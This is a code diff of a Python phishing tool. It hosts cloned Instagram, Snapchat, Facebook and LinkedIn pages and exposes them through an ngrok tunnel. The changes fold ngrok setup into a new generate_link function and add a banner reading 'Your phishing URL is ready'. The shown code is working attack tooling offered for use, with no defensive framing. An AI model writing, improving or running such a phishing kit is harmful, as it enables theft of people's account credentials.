@@ -16,16 +16,23 @@ import threading
 # Initialize colorama for Windows
 colorama.init()
 
-def install_ngrok():
+def generate_link(platform):
+    print("\nChoose link generation method:")
+    print("[1] Ngrok")
+    choice = input("Enter your choice: ").strip()
+    
+    if choice != '1':
+        print("Invalid choice!")
+        return None
+        
+    # Check and install ngrok if needed
     print("\nChecking ngrok installation...")
     try:
-        # Check if ngrok is installed
         subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
         print("✓ Ngrok is already installed")
     except (subprocess.CalledProcessError, FileNotFoundError):
         print("× Ngrok not found. Installing...")
         try:
-            # Add ngrok repository and install
             os.system('curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null')
             os.system('echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list')
             os.system('sudo apt update')
@@ -33,37 +40,31 @@ def install_ngrok():
             print("✓ Ngrok installed successfully")
         except Exception as e:
             print(f"× Error installing ngrok: {str(e)}")
-            return False
-    return True
-
-def setup_ngrok_auth():
-    print("\nChecking ngrok authentication...")
+            return None
+            
+    # Setup ngrok authentication
     try:
-        # Try to get tunnels to check if auth is set
         requests.get("http://localhost:4040/api/tunnels")
-        print("✓ Ngrok auth token already configured")
-        return True
     except:
-        print("× Ngrok auth token not configured")
-        print("\nPlease get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
+        print("\nNgrok auth token not configured")
+        print("Please get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
         token = input("Enter your ngrok auth token: ").strip()
         
         if token:
             try:
                 result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
                                      capture_output=True, text=True)
-                if result.returncode == 0:
-                    print("✓ Auth token configured successfully")
-                    return True
-                else:
+                if result.returncode != 0:
                     print(f"× Error configuring auth token: {result.stderr}")
-                    return False
+                    return None
             except Exception as e:
                 print(f"× Error configuring auth token: {str(e)}")
-                return False
+                return None
         else:
             print("× No token provided")
-            return False
+            return None
+    
+    return serve_website(platform)
 
 def serve_website(platform):
     # Define the directory to serve based on platform
@@ -125,19 +126,32 @@ def serve_website(platform):
                 url = tunnels[0]['public_url']
                 if not url.startswith('https'):
                     url = url.replace('http', 'https')
+                print("\n" + "=" * 60)
+                print(colored("Your phishing URL is ready:", 'yellow'))
+                print(colored(url, 'green', attrs=['bold']))
+                print(colored("Press Ctrl+C to stop", 'red'))
+                print("=" * 60 + "\n")
                 os.chdir("../../")  # Return to original directory
-                return url
+                
+                # Keep running until Ctrl+C
+                try:
+                    while True:
+                        time.sleep(1)
+                except KeyboardInterrupt:
+                    print("\n\nStopping server...")
+                    if os.name == 'nt':
+                        os.system('taskkill /f /im ngrok.exe 2>nul')
+                    else:
+                        os.system('pkill ngrok')
+                    return None
+                    
             else:
                 print("× Error: No ngrok tunnels found")
-                print("Try configuring your auth token again:")
-                setup_ngrok_auth()
                 os.chdir("../../")
                 return None
                 
         except Exception as e:
             print(f"× Error getting ngrok URL: {str(e)}")
-            print("Try configuring your auth token again:")
-            setup_ngrok_auth()
             os.chdir("../../")
             return None
             
@@ -151,7 +165,7 @@ def serve_website(platform):
         os.chdir("../../")
         return None
 
-def print_menu(active_url=None):
+def print_menu():
     # Create a Figlet object with a different font style
     figlet = Figlet(font='slant')
     
@@ -208,8 +222,7 @@ def print_menu(active_url=None):
         "[2] Snapchat",
         "[3] Facebook",
         "[4] LinkedIn",
-        "[5] Stop Current Link",
-        "[6] Exit",
+        "[5] Exit",
         "",
         "Enter your choice: "
     ]
@@ -219,14 +232,6 @@ def print_menu(active_url=None):
         padding = (frame_width - 2 - len(option)) // 2
         final_line = colored('║', 'cyan') + ' ' * padding + colored(option, 'white') + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
         final_art.append(final_line)
-    
-    # Add active URL if available
-    if active_url:
-        final_art.extend([empty_line])
-        url_text = f"Active URL: {active_url}"
-        padding = (frame_width - 2 - len(url_text)) // 2
-        url_line = colored('║', 'cyan') + ' ' * padding + colored(url_text, 'green') + ' ' * (frame_width - 2 - padding - len(url_text)) + colored('║', 'cyan')
-        final_art.append(url_line)
     
     final_art.extend([
         empty_line,
@@ -262,43 +267,20 @@ def print_menu(active_url=None):
     
     return input(colored(menu_options[-1], 'white'))
 
-def stop_current_link():
-    # Kill ngrok process
-    if os.name == 'nt':  # Windows
-        os.system('taskkill /f /im ngrok.exe 2>nul')
-    else:  # Linux/Mac
-        os.system('pkill ngrok')
-    print("\n✓ Link stopped successfully")
-    time.sleep(1)
-    return None
-
 def main():
-    # Check and install ngrok if needed
-    if not install_ngrok():
-        print("Failed to install ngrok. Please install it manually.")
-        return
-    
-    # Setup ngrok authentication
-    if not setup_ngrok_auth():
-        print("Failed to configure ngrok auth token. Please try again.")
-        return
-    
-    active_url = None
     while True:
-        choice = print_menu(active_url)
+        choice = print_menu()
         if choice == '1':
-            active_url = serve_website('instagram')
+            generate_link('instagram')
         elif choice == '2':
-            active_url = serve_website('snapchat')
+            generate_link('snapchat')
         elif choice == '3':
-            active_url = serve_website('facebook')
+            generate_link('facebook')
         elif choice == '4':
-            active_url = serve_website('linkedin')
+            generate_link('linkedin')
         elif choice == '5':
-            active_url = stop_current_link()
-        elif choice == '6':
             print("\nExiting...")
-            # Kill ngrok on exit
+            # Kill any running ngrok process
             if os.name == 'nt':
                 os.system('taskkill /f /im ngrok.exe 2>nul')
             else:
